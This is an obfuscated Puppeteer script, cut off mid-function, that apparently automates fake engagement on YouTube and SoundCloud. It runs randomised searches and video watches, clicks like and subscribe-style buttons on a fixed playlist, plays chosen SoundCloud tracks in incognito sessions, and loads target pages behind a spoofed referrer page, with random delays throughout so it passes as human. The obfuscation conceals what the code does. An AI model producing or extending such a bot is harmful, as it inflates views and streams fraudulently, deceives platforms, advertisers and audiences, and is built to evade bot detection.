const Z = d,
  Y = b,
  X = c;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x45 * 0x10 + 0x2203 + -0x2652))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x149 * 0x6 + 0x479 + -0x1 * -0x33d), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x331 + -0x1 * -0x70d9 + -0x4 * -0x1e2 + (-0x20ab * 0x1 + 0x6af3 + -0xfb0) * random()) : await standardWaitForNetIdle(f), await wait(0x449 * -0x7 + -0x15fa + 0x4781 + (0x27be + -0x10c1 + 0x1013) * random()), -0x4 * -0x555 + 0x1a88 + -0x2fdb;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x92f * 0x1 + 0x1e9 + 0x2 * 0x438), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x1 * -0x509 + 0x2 * -0xf5a + 0x23be;
}
async function randomWait() {
  return await wait(-0x1729 + -0x9a5 + 0x3456 + (-0x2 * 0xa70 + 0x24c + 0x261c) * random()), -0x1 * -0x12b6 + 0x367 * -0xb + 0x12b8;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    const S = d,
      R = c;
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + R(0x0) + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + S(0x9) + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x1 * 0x2296 + 0x32 * 0x47 + 0x4e * 0x44, -0xe0e + 0xe0b * -0x1 + 0x1c20), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x17fb3 + 0xb191 + -0x146e4) * getRandomInt(-0x1 * -0x1279 + 0x415 + -0x168c, -0x712 * 0x4 + -0x7 * 0x107 + 0x237e), h)), -0x2261 * 0x1 + 0x162b + 0xc37;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x1f * -0x102 + -0xa57 * 0x3 + -0x39;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x169 * -0x11 + 0x7 * 0x4c3 + 0x1 * -0x394d]['split']('\x20');
    for (let k = 0xed1 + 0x71f + -0x15f0; k < i['length']; k += -0x1b57 * 0x1 + -0x1d77 + 0x38d0)
      j += i[k] * h[i[k + (-0x1 * -0x162d + 0xb9e + -0xad * 0x32)]];
    return j;
  });
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x1be3 + 0xc2e * 0x1 + -0x1 * 0x2811);
    let h = e[f];
    if (c['ooGiMG'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x239d + 0x13b0 + -0x507 * 0xb, r, s, t = 0xd0b + 0x173 + 0x2 * -0x73f; s = m['charAt'](t++); ~s && (r = q % (-0x1 * -0x2203 + 0x227 + -0x2426) ? r * (0x479 + 0x1bb8 + -0x25 * 0xdd) + s : s, q++ % (-0x88 + -0x1 * -0x12cf + -0x11 * 0x113)) ? o += String['fromCharCode'](-0x44 * 0x29 + 0x23a7 + -0x17c4 & r >> (-(0x449 * -0x7 + -0x15fa + 0x33fb) * q & 0x13df + -0x860 + -0xb79)) : -0x4 * -0x555 + 0x1a88 + -0x2fdc) {
          s = n['indexOf'](s);
        }
        for (let u = 0x92f * 0x1 + 0x1e9 + 0x1 * -0xb18, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x1 * -0x509 + 0x2 * -0xf5a + 0x23cd))['slice'](-(-0x1729 + -0x9a5 + 0x20d0));
        }
        return decodeURIComponent(p);
      };
      c['topcrb'] = i, b = arguments, c['ooGiMG'] = !![];
    }
    const j = e[-0x2 * 0xa70 + 0x24c + 0x1294],
      k = f + j,
      l = b[k];
    return !l ? (h = c['topcrb'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function anchorAndView(f) {
  const T = d;
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log(T(0x8) + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x1210 + 0x54d + -0x1757)['map'](l => Array['from'](l['children']))['flat'](-0x81 * 0x2 + 0x1dff + -0x1cfc)['map'](l => l['childNodes'][-0xee0 + -0xa * 0x2fa + 0x1 * 0x2ca5]['childNodes'][-0x8 * 0x21 + 0x2 * 0xc07 + -0x1706]['childNodes'][0x1f86 + -0x3a * -0x9e + -0x4351]['childNodes'][0xc87 + 0xd92 + 0x189 * -0x11]['childNodes'][-0x162b + 0x269c + -0x1070]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x3 * -0x2b8 + 0x5f2 * -0x2 + 0x17f4, -0x53 * -0x4b + 0x346 * -0x1 + -0x183)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x2136 + -0xb * -0x2db + -0x607);
  const h = await getMaxTime(f),
    i = Math['min']((0x1 * -0x12605 + 0x15b9 * -0x9 + 0x2d3e6) * getRandomInt(-0x1 * -0xb1b + -0x1283 + -0x2 * -0x3b5, 0x68 * -0x50 + -0x287 * 0xb + 0x3c52), h);
  return await wait(i), 0x224c + 0x8f9 + -0x2b44;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0x2bd * 0x7 + 0x91e + 0xa0d]['children'][-0x120e + -0x1 * -0x12cb + 0x1b * -0x7]['children'][0x2247 + 0x22a7 + -0x44ee]['children'][0x1 * 0x13c3 + -0x218 + -0x11ab]['children'][-0x35 * -0x91 + 0x1011 + -0x2e16]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x1df5 * 0x1 + -0xbc2 + 0x29b8;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x1 * -0xc8 + -0x559 * 0x3 + 0xfa7 + (0xe8b + -0x11e0 + -0x15 * -0x2b) * random()
  }), await wait(-0xeb1 * -0x2 + 0x2 * -0x25c + -0x16b6 + (-0x4a2 * -0x4 + 0x6f4 + 0x1 * -0x1850) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x252a + -0x3 * 0xa17 + 0x4371 * 0x1]['childNodes'][0x1a94 + 0x188a + -0x331d]['childNodes'][0x503 * 0x5 + -0x655 + 0x1 * -0x12b9]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x7b8 + -0x17c7 + 0x1f84 * 0x1]['childNodes'][-0x949 + 0x2 * -0xa6f + 0x1e27]['childNodes'][-0x23d0 + 0x18be + 0x2c5 * 0x4]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0xe9a + -0x21fe + 0x1 * 0x1365),
          r = 0x6 * -0x23 + -0x10d * -0xf + 0x11 * -0xe1;
        for (let u = -0x1c01 + 0x181d + 0x3e4; u < q['length']; u += 0x225b * 0x1 + 0x1323 + 0x7a4 * -0x7)
          r += q[u] * k[q[u + (-0xeed + -0x23d4 + 0x32c2)]];
        return r;
      }(n);
  });
  await wait((0x2d00 + -0x4 * -0x1191 + 0x2 * -0x1c56) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x16de * 0x13 + -0x1 * -0x1ce94 + 0x139 * -0x21e) * getRandomInt(-0x1115 * 0x1 + 0x46 * -0x4e + 0x266a * 0x1, -0x844 * -0x3 + -0x615 * 0x5 + 0x5a7), h + (0x1 * -0x67a + -0xa07 + 0x9 * 0x401));
  return await wait(i), -0x103a * -0x2 + 0x187e + -0x38f1;
}
async function keyWatch(f) {
  const U = b;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x2644 + -0x2 * 0x9ca + -0x1 * -0x39d8), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + U(0x1e, '@R6D') + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0xb7e + -0xf11 + 0x2647 + (0x1a13 + 0x20ca + -0x1 * 0x36f5) * Math['random']());
    });
  }, -0xf13 * -0x1 + 0xb36 + 0x10f);
  await wait(0x1c5d4 + 0xdf * -0x260 + -0x102 * -0x4d6);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x11 * 0xe79 + -0x98a5 * -0x1 + 0x147c4) * getRandomInt(0x1d8f + -0xf94 + 0x41 * -0x37, -0x4ac + -0x15 * 0x117 + 0x1ba8)), clearInterval(h), -0x1d * -0xbf + 0xc * 0x2ee + -0x38ca;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x1be3 + 0xc2e * 0x1 + -0x1 * 0x2811);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x16 * -0x2a + -0x337 + 0x6d3;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x1 * -0x2ce + 0x147b + -0x254 * 0xa;
    await randomWait();
  }
  return -0x26 * -0x4e + 0x3d * 0x40 + -0x6d * 0x3f;
}

function a() {
  const bo = [
    'ywDLls1MAwXSlq',
    '2%91%E6%92',
    'W59rWRRcRq/dRCkhhmkvWOi',
    'zs95B3v0DwjLlG',
    'ChrZlZqWntK1nq',
    'W58gW63cR1VcRq',
    'u2fMyxjPlZuZnW',
    'CMCVzw4VC2nYAq',
    'clicked\x20vi',
    'core-image',
    'WOyPWP7dIubEW7a7wgG',
    'W7ZdI2NcHmobW4pdMruPrG',
    'DY55B3v0DwjLlG',
    'e/zhihu.co',
    'WQlcIYBcLSkmWPNdIt9RhW',
    '7DjOp_JM2Z',
    'ChrZlZqXmJy5oa',
    'mdq0lxPOAwH1lq',
    'catch',
    'W7qpae0mWRNcNSkfW7GU',
    'hashed',
    'f8kmWR/cSCkICJTGWPpcGW',
    '-video-dow',
    'dium.com/@',
    'WQ7cGrf/mKZdLHf3WOa',
    'CMfUzg9T',
    'newPage',
    'WRlcKmknWRRdJSksaNC8tW',
    '63-irfPjh2',
    'w.wsj.com/',
    'W4jkpmk8W6ezW640WRtcKq',
    'lxHJBgLLBNqTyG'
  ];
  a = function() {
    return bo;
  };
  return a();
}

function fetchRandomSC() {
  const V = b;
  return Math['random']() <= 0xd * 0x187 + 0x1ab4 + 0x19b * -0x1d + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x15b1 + 0x32e + 0x1 * -0x18df + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + V(0xb, 'pT(W') + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x2b * 0x35 + 0x14a4 + -0xbbd + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x12 * -0x18c + 0x2328 + -0x3f00;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x2617 * -0x1 + -0x106b * 0xa + 0x12ddf + getRandomInt(0x60a7 + 0x41ae + -0x67bd, 0xdd28 + 0x165e * -0x4 + -0x1d0 * 0x8));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x1694 + 0x1d7e * 0x1 + -0x1 * 0x6e9), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0xfe0 + 0x478 + 0xb68;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x1de + -0x1a0 + -0x3e, 0x1 * -0x699 + -0x114b + 0x1816)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x1 * 0x141a + -0xf * 0x8e + 0xfe * -0x4 + floor((0x13d * 0x1b + -0x2473 * -0x1 + -0x41fa) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0x2730b * 0x61ca + -0x4 * -0x2f3b3037 + -0x12c72b28a),
          0x1141 * 0x214 + -0xca7156 + 0x1269642,
          0x1 * 0xe9 + 0x7e25 * 0x2 + 0x1 * -0x7d33,
          -0x4 * 0x42d + -0x811 + 0x1 * 0x1945
        ], y = [
          -0xba * 0x17 + -0x1d5b + 0x2e29,
          -0x1b2c + -0x25 * 0xda + 0x3abe,
          0x18f * -0x3 + -0x5 * 0x21b + -0x28a * -0x6,
          0x9 * 0xee + -0x145d + -0x25 * -0x53
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x1 * -0x421 + 0x1b6b + -0x5f * 0x55)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x216b + 0x1150 + -0x32bb; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0xde7 + -0xb5e + -0x289) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x1bf8 + 0x15a6 + 0x652] = A[0x13bc + -0x17 * -0x116 + -0x2ca6 * 0x1] = A[0x1 * 0x1327 + 0x1e04 + 0x7 * -0x706] = A[0x1f29 * 0x1 + -0x6f2 + 0x1 * -0x1835] = A[-0x103f + 0x25a9 + -0x1567] = A[0x1673 + 0x25ad + -0x3c1c] = A[-0x657 + 0x1 * -0x185 + 0x7e1] = A[-0x1a0a + -0x2546 + -0x2 * -0x1fab] = A[-0x2 * -0x4f5 + 0x6 * 0x164 + -0x123b] = A[0x1006 + 0x1f65 + -0x2f63] = A[-0x212 + 0x1b8d + -0x1972] = A[0x267d + 0x207b + -0x7 * 0xa22] = A[0x1e1f * 0x1 + 0xbc * 0x7 + -0x2338] = A[0xe14 + -0x7ea + -0x61e] = A[0x1 * 0x1471 + -0x1cd5 + 0x871 * 0x1] = A[-0xc62 + -0x3bc + -0xb4 * -0x17] = A[0x48c + -0x890 * -0x4 + -0x1 * 0x26bd] = -0x1945 * -0x1 + 0x19c7 + -0x330c, this['blocks'] = A) : this['blocks'] = [
                0x16 * 0x1 + 0x1 * -0x16f9 + 0x345 * 0x7,
                -0xf * -0x24f + -0x268 + -0x2039,
                -0x1 * -0x2507 + -0x269d + 0x7 * 0x3a,
                -0x1f13 + -0x3d1 * -0x5 + 0xbfe,
                0xb5 * -0x2a + 0x41 * -0x80 + 0x3e32,
                -0x7d5 + 0x17d * -0x1 + 0x4a9 * 0x2,
                -0xa6 * -0x27 + 0x2558 + -0x3ea2,
                -0x1e1 * 0xb + 0x18 * 0xa8 + 0x4eb,
                -0x2a4 + -0x26d9 + 0x297d,
                0xbfa * 0x1 + 0x9e2 + -0x15dc,
                0x1 * -0xfbb + 0x1be3 + -0xc28,
                0x1 * 0x18b9 + -0x4ff * 0x1 + -0x9dd * 0x2,
                -0x19b7 * 0x1 + -0x1b * -0xbb + 0x5fe,
                0x150d + 0x1 * -0x1549 + 0x3c,
                -0x362 + -0x1 * -0x2489 + -0x2127,
                0x1d20 + 0x17b * -0x8 + -0x1148,
                0x208d * 0x1 + -0x115 * -0x5 + -0x56 * 0x71
              ], this['h0'] = -0x7fb36922 + 0x7 * -0x364a232 + 0xfeb8fb81, this['h1'] = -0x4 * -0x8514533 + 0xa6998879 + -0xa * -0x3fe4e3a, this['h2'] = -0x51e55d * -0x1cd + -0x78fb * -0x2640e + -0x11bfdd535, this['h3'] = 0x6b6e75d + -0x13f1f072 + 0x1d6d5d8b, this['h4'] = -0x133b6a188 + -0x1 * -0x14ac170bf + -0x5 * -0x228e6a25, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x5d4 * -0x2 + -0x3 * 0x2b7 + -0x383, this['finalized'] = this['hashed'] = -0x2 * -0xaac + 0x1079 + -0x25d1, this['first'] = 0x53d + 0x6 * 0x62b + -0x2a3e;
            }
            ['update'](J) {
              const W = d;
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x2167 + -0x31d * 0x1 + -0x1e4a, O = J['length'] || -0x1a9 * -0x1 + -0x6e7 + 0x53e, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x1ac1 * -0x1 + -0x24f7 * 0x1 + -0x3fb8 * -0x1, P[0x3fa + 0x4 * -0x72b + 0x18b2] = this['block'], P[-0x1f47 + -0x2c7 * -0x5 + 0x1174] = P[0x1c85 + -0x242c + 0x7a8] = P[0x4af + -0x62 * -0x4a + -0x11 * 0x1f1] = P[0xe23 + 0xd * -0x8f + 0x7 * -0xfb] = P[-0xe76 + 0x2627 * -0x1 + 0x34a1] = P[-0x2e1 + 0x13bd + -0x3 * 0x59d] = P[0x222b + 0x56 * 0x17 + -0x29df] = P[0x23 * -0xa9 + -0x3 * 0x287 + 0x1eb7] = P[-0x2 * -0xf73 + -0x1ec2 + -0xe * 0x2] = P[0x19c4 + -0x3a * 0x9 + -0x17b1] = P[0x1 * 0xc2e + -0x1 * 0x2b9 + 0x96b * -0x1] = P[-0x119 * 0x13 + -0x1 * -0xd37 + -0x7 * -0x119] = P[0x2 * 0x1c1 + -0x226a + 0x1 * 0x1ef4] = P[-0x10c1 + -0x182c + 0x28fa] = P[-0x7 * 0x547 + -0x17dd + 0x3cdc] = P[0xad2 + 0xabc * -0x2 + 0xab5] = -0x193d * -0x1 + 0x16de * 0x1 + -0x301b), K) {
                    for (N = this['start']; M < O && N < 0x2 * 0xbf7 + 0x12ba * -0x1 + -0x4f4; ++M)
                      P[N >> -0x421 + 0x97d * 0x4 + -0x21d1] |= J[M] << y[-0x5 * -0x36f + 0x1 * -0x17 + 0x1111 * -0x1 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x1607 * -0x1 + 0x2350 + -0xd09; ++M)
                      (L = J['charCodeAt'](M)) < 0xa88 * 0x2 + -0x1060 + -0x430 ? P[N >> -0x11cc + -0x1e + 0x11ec] |= L << y[-0xd7a + -0x23 * -0x10e + -0x176d & N++] : L < 0x1 * 0x15f7 + -0x57 * -0x2 + -0xea5 ? (P[N >> -0x2530 + -0x26c4 + 0x4bf6 * 0x1] |= (0xfee + -0x2542 + 0x1614 | L >> 0xe21 * -0x1 + -0x12ea + 0x5 * 0x69d) << y[-0x2a0 + -0x4 * -0x7e1 + -0x1ce1 & N++], P[N >> 0xd4 * 0x16 + -0x505 + -0xd31] |= (0x6c5 + -0xb92 + -0x3b * -0x17 | -0x18b5 + 0xa56 + 0x1 * 0xe9e & L) << y[-0x27a * 0x2 + -0xdcd + 0x12c4 & N++]) : L < 0x16580 + 0x3950 + 0x4 * -0x31b4 || L >= -0x114d7 * -0x1 + -0x1afe * -0xb + 0x7 * -0x31f7 ? (P[N >> -0xb5a + -0x8b * 0x17 + 0x3 * 0x7f3] |= (-0x1c6 + -0x1d0a + 0x1fb * 0x10 | L >> 0x14bc + 0x1 * 0x21dd + 0xae9 * -0x5) << y[-0x9d5 + 0xfd3 + 0x5fb * -0x1 & N++], P[N >> -0x1 * -0xf01 + -0xb8a + -0x375] |= (-0x14f0 + -0x1c6f + 0x31df | L >> 0x6fb * -0x2 + 0xd3a + -0x1 * -0xc2 & -0x2193 + -0x929 + 0x2afb * 0x1) << y[-0x1a92 + 0x2261 + -0x7cc & N++], P[N >> 0x7 * -0x251 + -0xa75 + 0x1aae] |= (-0x1 * -0x130d + -0x3 * -0xa4e + -0x3 * 0x107d | 0x1863 + 0xfd6 + 0x12d * -0x22 & L) << y[0x205e + 0x7ff + -0x285a & N++]) : (L = 0x19cf5 + 0xe * 0x214a + 0x12e1 * -0x21 + ((0xeda + -0xc77 * -0x1 + -0x1752 & L) << -0x89b + -0x1a63 + 0x2308 | 0x1f76 + 0x800 + -0x7 * 0x511 & J['charCodeAt'](++M)), P[N >> 0x8e * -0x1c + -0x1 * 0xdb5 + 0x1d3f] |= (0x26 * -0x26 + 0x22ea + -0x1c56 | L >> 0x32 * 0x1 + -0x1fb0 + 0x1f90) << y[-0x165b + -0xc2e + 0x228c & N++], P[N >> 0x2600 + 0xaab * -0x1 + -0x1b53] |= (-0x9db * 0x1 + 0x2 * -0x99b + 0x1d91 | L >> -0x849 + 0x18e * -0x2 + -0x1 * -0xb71 & -0x20df + 0x57d + 0x1ba1) << y[0xbd2 + -0x76 * -0xc + -0x1157 & N++], P[N >> 0x5ac + 0x1b5 + -0x25 * 0x33] |= (-0x1ef4 + -0x832 + 0x27a6 | L >> 0x23c9 * 0x1 + 0x1b9d * 0x1 + -0x3f60 & 0x239 * 0x1 + 0xdf * -0x2b + 0x237b) << y[-0x1393 + 0x3b7 * -0x5 + -0x1 * -0x2629 & N++], P[N >> 0xaf2 + -0x1 * -0x94f + 0x49 * -0x47] |= (0x184f + 0x5b1 + -0x10 * 0x1d8 | -0xbd3 * 0x3 + 0xe58 + 0x1560 & L) << y[0x1 * -0x243d + -0x2 * 0x3df + 0x2bfe & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x256c + 0x1455 + 0x7 * -0x837 ? (this['block'] = P[-0x1201 + 0x53e * -0x2 + -0x1c8d * -0x1], this['start'] = N - (-0xd * -0x1cf + 0x25b * -0x7 + -0x363 * 0x2), this['hash'](), this[W(0x14)] = -0x940 + -0x2 * 0x269 + -0xe13 * -0x1) : this['start'] = N;
                }
                return this['bytes'] > -0x182e28d43 + -0x125d7 * 0x19f51 + 0x45f970f49 && (this['hBytes'] += this['bytes'] / (-0x65421e2c + -0x3d * 0x4ed1060 + 0x291bf050c) << 0x1a88 + 0x1b4b + -0x3 * 0x11f1, this['bytes'] = this['bytes'] % (-0x1c * -0x1054c958 + -0x8 * 0xed9d1c + -0x3e7b0 * 0x31a4)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x11b3 + -0x3d7 * -0x3 + 0x33f * -0x9;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
